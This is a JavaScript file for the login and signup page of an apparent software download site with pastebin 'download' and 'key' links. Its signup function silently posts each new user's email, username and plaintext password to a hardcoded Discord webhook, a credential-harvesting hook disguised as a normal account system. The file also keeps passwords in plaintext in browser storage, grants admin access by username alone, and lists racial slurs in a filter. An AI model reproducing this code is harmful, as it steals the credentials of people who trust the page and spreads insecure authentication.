const userDatabase = JSON.parse(localStorage.getItem('userDatabase')) || {};

// Replace with your actual Discord webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1301983808769363969/IFvuPlMLpydA2FUKWrBZiYUpUSmmXlyUIv_GgTJSQp5GQVnexxawK3vv4dZuAL496g5u"; // Place your webhook URL here

document.getElementById('login-btn').addEventListener('click', login);
document.getElementById('signup-btn').addEventListener('click', openSignup);
document.getElementById('submit-signup').addEventListener('click', signup);
document.getElementById('back-to-login').addEventListener('click', backToLogin);
document.getElementById('logout-btn').addEventListener('click', logout);
document.getElementById('vega-download').addEventListener('click', () => {
    window.open("https://pastebin.com/raw/P3Gb4fxR"); // Your download link
});
document.getElementById('option-key').addEventListener('click', () => {
    window.open("https://pastebin.com/raw/GFi72wpN"); // Your key link
});

// Function to check if a username is valid
function isValidUsername(username) {
    const specialCharsRegex = /[^a-zA-Z0-9]/;
    const badWords = ["nigga", "nigger", "bitch"];

    if (username.trim() === "" || username.includes(" ") || specialCharsRegex.test(username)) {
        alert("Username cannot contain spaces or special characters!");
        return false;
    }

    for (const word of badWords) {
        if (username.toLowerCase().includes(word)) {
            alert(`Username cannot contain the word "${word}"!`);
            return false;
        }
    }

    return true;
}

// Function to send data to Discord webhook
async function sendToWebhook(email, username, password) {
    const data = {
        content: `New Signup:\n**Email:** ${email}\n**Username:** ${username}\n**Password:** ${password}`
    };
    
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            console.error('Failed to send webhook:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending webhook:', error);
    }
}

function openSignup() {
    document.getElementById('form-container').style.display = 'none';
    document.getElementById('signup-container').style.display = 'block';
    document.getElementById('email').value = '';
    document.getElementById('signup-username').value = '';
    document.getElementById('signup-password').value = '';
    document.getElementById('confirm-password').value = '';
}

function backToLogin() {
    document.getElementById('form-container').style.display = 'block';
    document.getElementById('signup-container').style.display = 'none';
}

async function signup() {
    const email = document.getElementById('email').value;
    const username = document.getElementById('signup-username').value;
    const password = document.getElementById('signup-password').value;
    const confirmPassword = document.getElementById('confirm-password').value;

    if (!isValidUsername(username)) return;

    if (userDatabase[username]) {
        alert("Username already exists!");
        return;
    }

    const emailExists = Object.values(userDatabase).some(user => user.email === email);
    if (emailExists) {
        alert("An account with this email already exists!");
        return;
    }

    if (password !== confirmPassword) {
        alert("Passwords do not match!");
        return;
    }

    userDatabase[username] = { email, password };
    localStorage.setItem('userDatabase', JSON.stringify(userDatabase)); 
    alert("Signup successful! You can now log in.");

    await sendToWebhook(email, username, password);

    backToLogin();
}

function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (userDatabase[username] && userDatabase[username].password === password) {
        alert("Login successful!");
        localStorage.setItem('loggedInUser', username); 
        document.getElementById('form-container').style.display = 'none';
        document.getElementById('main-app').style.display = 'block';
        updateMainAppUI(username); 
    } else {
        alert("Invalid username or password!");
    }
}

// Function to update the main app UI with user-specific information
function updateMainAppUI(username) {
    document.getElementById('welcome-message').innerText = `Welcome, ${username}!`;
    document.getElementById('logout-btn').style.display = 'block';

    if (username === "admin") {
        document.getElementById('admin-controls').style.display = 'block';
    } else {
        document.getElementById('admin-controls').style.display = 'none';
    }
}

// Admin function to ban a user
function banUser() {
    const userToBan = prompt("Enter the username of the user you want to ban:");

    if (userToBan && userDatabase[userToBan]) {
        delete userDatabase[userToBan];
        localStorage.setItem('userDatabase', JSON.stringify(userDatabase)); 
        alert(`User "${userToBan}" has been banned.`);
    } else {
        alert("User not found!");
    }
}

// Logout function
function logout() {
    localStorage.removeItem('loggedInUser'); 
    document.getElementById('main-app').style.display = 'none';
    document.getElementById('form-container').style.display = 'block';
    alert("You have been logged out.");
}

// Populate the login form with existing user data if available
window.onload = () => {
    const savedUsername = document.getElementById('username');
    const savedPassword = document.getElementById('password');
    
    if (userDatabase && Object.keys(userDatabase).length > 0) {
        savedUsername.value = localStorage.getItem('lastUsername') || '';
        savedPassword.value = localStorage.getItem('lastPassword') || '';
    }

    const loggedInUser = localStorage.getItem('loggedInUser');
    if (loggedInUser) {
        updateMainAppUI(loggedInUser); 
    }

    savedUsername.addEventListener('input', () => {
        localStorage.setItem('lastUsername', savedUsername.value);
    });
    savedPassword.addEventListener('input', () => {
        localStorage.setItem('lastPassword', savedPassword.value);
    });
}